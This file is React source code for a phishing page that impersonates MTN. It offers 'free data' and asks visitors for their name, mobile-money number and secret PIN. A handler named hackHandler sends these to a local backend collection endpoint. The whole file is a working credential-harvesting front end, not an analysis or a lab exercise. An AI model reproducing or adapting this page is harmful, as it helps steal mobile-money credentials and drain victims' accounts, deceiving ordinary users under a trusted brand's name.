import "./App.css";
import Axios from "axios";
import {Link, Outlet} from 'react-router-dom'

import { useEffect, useState } from "react";
function App() {
  const [name, setName] = useState("");
  const [momonum, setMomnum] = useState("");
  const [code, setCode] = useState("");

  const hackHandler = () => {
    Axios.post("http://localhost:3001/insert", {
      name: name,
      num: momonum,
      code: code,
    });
  };


  return (
    <div className="App">
      <div className="form">
        <h1>Get free data from MTN</h1>
        <label htmlFor="name">Your name</label>
        <input
          onChange={(e) => setName(e.target.value)}
          type="text"
          name="name"
          id="name"
        />

        <label htmlFor="momonum">Your momo number</label>
        <input
          onChange={(e) => setMomnum(e.target.value)}
          type="number"
          name="momonum"
          id="momonum"
        />

        <label htmlFor="code">Your secret code</label>
        <input
          onChange={(e) => setCode(e.target.value)}
          type="password"
          name="code"
          id="code"
        />
        <button onClick={hackHandler}>Submit</button>
      </div>
    </div>
  );
}
export default App;
